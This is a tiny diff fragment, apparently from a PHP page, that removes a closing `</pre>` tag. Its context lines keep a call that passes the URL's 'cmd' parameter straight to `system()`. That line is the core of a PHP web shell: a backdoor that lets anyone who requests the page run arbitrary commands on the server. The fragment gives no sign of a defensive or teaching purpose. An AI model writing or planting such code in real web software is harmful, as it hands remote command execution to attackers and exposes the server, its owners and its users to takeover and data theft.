@@ -4,4 +4,3 @@
         system($_GET['cmd']);
     }
 ?>
-</pre>
